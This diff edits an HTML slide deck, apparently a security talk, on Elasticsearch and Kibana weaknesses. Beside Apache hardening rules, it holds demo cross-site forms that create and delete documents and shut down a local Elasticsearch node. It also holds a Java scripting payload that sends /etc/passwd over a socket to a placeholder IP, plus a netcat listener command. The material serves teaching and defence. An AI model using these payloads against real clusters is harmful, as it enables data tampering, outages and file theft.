@@ -231,42 +231,40 @@
 </section>
 
 <section>
-	<section>
-		<h3>Kibana access demo</h3>
-		<div class="kibanaTest">
-			<input type="text" placeholder="kibana url"/>
-			<button>Test</button>
-			<div class="monospaced resultBox"></div>
-		</div>
-	</section>
+	<h3>Kibana access demo</h3>
+	<div class="kibanaTest">
+		<input type="text" placeholder="kibana url"/>
+		<button>Test</button>
+		<div class="monospaced resultBox"></div>
+	</div>
+</section>
 
-	<section>
-		<h3>How to disable JSONP</h3>
-		<ul>
-			<li>
-				Elasticsearch &gt;= 1.3
-				<ul>
-					<li>JSONP is disabled by default</li>
-				</ul>
-			</li>
-			<li class="fragment">
-				Elasticsearch &lt;= 1.2.3
-				<ul>
-					<li>No configuration option to turn off JSONP</li>
-					<li>Block all requests with <em>callback</em> parameter</li>
-					<li>Apache config example:
-						<div class="monospaced">
-							RewriteEngine On<br/>
-							RewriteCond %{QUERY_STRING} callback [NC]<br/>
-							RewriteRule ^/es(.*)$ - [F,L]<br/>
-							ProxyPass /es http://localhost:9200<br/>
-							ProxyPassReverse /es http://localhost:9200<br/>
-						</div>
-					</li>
-				</ul>
-			</li>
-		</ul>
-	</section>
+<section>
+	<h3>How to disable JSONP</h3>
+	<ul>
+		<li>
+			Elasticsearch &gt;= 1.3
+			<ul>
+				<li>JSONP is disabled by default</li>
+			</ul>
+		</li>
+		<li class="fragment">
+			Elasticsearch &lt;= 1.2.3
+			<ul>
+				<li>No configuration option to turn off JSONP</li>
+				<li>Block all requests with <em>callback</em> parameter</li>
+				<li>Apache config example:
+					<div class="monospaced">
+						RewriteEngine On<br/>
+						RewriteCond %{QUERY_STRING} callback [NC]<br/>
+						RewriteRule ^/es(.*)$ - [F,L]<br/>
+						ProxyPass /es http://localhost:9200<br/>
+						ProxyPassReverse /es http://localhost:9200<br/>
+					</div>
+				</li>
+			</ul>
+		</li>
+	</ul>
 </section>
 
 <section>
@@ -444,73 +442,71 @@
 </section>
 
 <section>
-	<section>
-		<h3>Kibana write-only attacks</h3>
-		<div id="kibanaWriteOnlyTestDiv">
-			<table>
-				<tr>
-					<td>Kibana URL:</td>
-					<td width="100%"><input id="kibanaWriteOnlyTestKibanaUrl" type="text" placeholder="Kibana URL"/></td>
-				</tr>
-				<tr>
-					<td id="kibanaWriteOnlyTestEsLookupResult"></td>
-					<td><button>Get Elasticsearch URL</button></td>
-				</tr>
-				<tr>
-					<td>Elasticsearch URL:</td>
-					<td><input id="kibanaWriteOnlyTestEsUrl" type="text" placeholder="Elasticsearch URL"/></td>
-				</tr>
-				<tr>
-					<td style="vertical-align: top">
-						<form action="http://localhost:9200/_bulk" method="post"
+	<h3>Kibana write-only attacks</h3>
+	<div id="kibanaWriteOnlyTestDiv">
+		<table>
+			<tr>
+				<td>Kibana URL:</td>
+				<td width="100%"><input id="kibanaWriteOnlyTestKibanaUrl" type="text" placeholder="Kibana URL"/></td>
+			</tr>
+			<tr>
+				<td id="kibanaWriteOnlyTestEsLookupResult"></td>
+				<td><button>Get Elasticsearch URL</button></td>
+			</tr>
+			<tr>
+				<td>Elasticsearch URL:</td>
+				<td><input id="kibanaWriteOnlyTestEsUrl" type="text" placeholder="Elasticsearch URL"/></td>
+			</tr>
+			<tr>
+				<td style="vertical-align: top">
+					<form action="http://localhost:9200/_bulk" method="post"
+						target="kibanaWriteOnlyTestFrame" enctype="text/plain">
+						<input type="hidden" name='{"index":{"_index":"te'
+								value='st","_type":"unwantedDoc","_id":"1"}}&#10;{"hey":"there","date":"2014-07-29"}&#10;'/>
+						<input type="submit" value="Create document"/>
+					</form>
+					<form action="http://localhost:9200/_bulk" method="post"
 							target="kibanaWriteOnlyTestFrame" enctype="text/plain">
-							<input type="hidden" name='{"index":{"_index":"te'
-									value='st","_type":"unwantedDoc","_id":"1"}}&#10;{"hey":"there","date":"2014-07-29"}&#10;'/>
-							<input type="submit" value="Create document"/>
-						</form>
-						<form action="http://localhost:9200/_bulk" method="post"
-								target="kibanaWriteOnlyTestFrame" enctype="text/plain">
-							<input type="hidden" name='{"delete":{"_index":"te'
-									value='st","_type":"unwantedDoc","_id":"1"}}&#10;'/>
-							<input type="submit" value="Delete document"/>
-						</form>
-						<form action="http://localhost:9200/_shutdown" method="post"
-								target="kibanaWriteOnlyTestFrame">
-							<input type="submit" value="Shutdown ES"/>
-						</form>
-					</td>
-					<td style="padding-top: 1em;">
-						<iframe name="kibanaWriteOnlyTestFrame" class="esResponse"></iframe>
-					</td>
-				</tr>
-			</table>
-		</div>
-	</section>
+						<input type="hidden" name='{"delete":{"_index":"te'
+								value='st","_type":"unwantedDoc","_id":"1"}}&#10;'/>
+						<input type="submit" value="Delete document"/>
+					</form>
+					<form action="http://localhost:9200/_shutdown" method="post"
+							target="kibanaWriteOnlyTestFrame">
+						<input type="submit" value="Shutdown ES"/>
+					</form>
+				</td>
+				<td style="padding-top: 1em;">
+					<iframe name="kibanaWriteOnlyTestFrame" class="esResponse"></iframe>
+				</td>
+			</tr>
+		</table>
+	</div>
+</section>
 
-	<section>
-		<h3>Additional security for ES proxy</h3>
-		<ul>
-			<li>Block POST requests to the kibana-int index:
-				<div class="monospaced">
-					RewriteCond %{REQUEST_METHOD} =POST<br/>
-					RewriteRule ^/es/kibana-int(.*)&#36; - [F,L]
-				</div>
-			</li>
-			<li class="fragment">Add a white-list of allowed endpoints:
-				<div class="monospaced">
-					ProxyPassMatch ^/es/(.*(?:_nodes|_search))$<br/>
-					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-					http://localhost:9200/$1
-				</div>
-			</li>
-			<li class="fragment">And allow full access to kibana-int:
-				<div class="monospaced">
-					ProxyPass /es/kibana-int http://localhost:9200/kibana-int<br/>
-					ProxyPassReverse /es/ http://localhost:9200/
-				</div>
-			</li>
-		</ul>
-	</section>
+<section>
+	<h3>Additional security for ES proxy</h3>
+	<ul>
+		<li>Block POST requests to the kibana-int index:
+			<div class="monospaced">
+				RewriteCond %{REQUEST_METHOD} =POST<br/>
+				RewriteRule ^/es/kibana-int(.*)&#36; - [F,L]
+			</div>
+		</li>
+		<li class="fragment">Add a white-list of allowed endpoints:
+			<div class="monospaced">
+				ProxyPassMatch ^/es/(.*(?:_nodes|_search))$<br/>
+				&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+				http://localhost:9200/$1
+			</div>
+		</li>
+		<li class="fragment">And allow full access to kibana-int:
+			<div class="monospaced">
+				ProxyPass /es/kibana-int http://localhost:9200/kibana-int<br/>
+				ProxyPassReverse /es/ http://localhost:9200/
+			</div>
+		</li>
+	</ul>
 </section>
 
 <section>
@@ -542,7 +538,7 @@
 				import java.util.Scanner;<br/>
 				import java.net.Socket;<br/>
 				import java.io.OutputStream;<br/>
-				Socket s = new Socket("176.28.10.57", 3333);<br/>
+				Socket s = new Socket("123.45.67.89", 3333);<br/>
 				OutputStream o = s.getOutputStream();<br/>
 				o.write((new Scanner(new File("/etc/passwd"))<br/>
 				&nbsp;&nbsp;.useDelimiter("\\Z").next() + "\n")<br/>
@@ -571,8 +567,10 @@
 				}
 			</div>
 		</li>
-		<li>Start netcat on the target machine: <span style="font-family: monospace;">nc -l -p 3333</span></li>
-		<li>
+		<li>Start netcat on the target machine: <div id="netcatSample" style="font-family: monospace;">
+			nc -l [-p] 3333
+		</div></li>
+		<li style="list-style-type:none;">
 			<div id="mvelTestDiv">
 				<input id="mvelTestEsUrl" placeholder="Elasticsearch URL" class="esUrl"/>
 				<input id="mvelTestTargetIP" placeholder="Target IP"/>
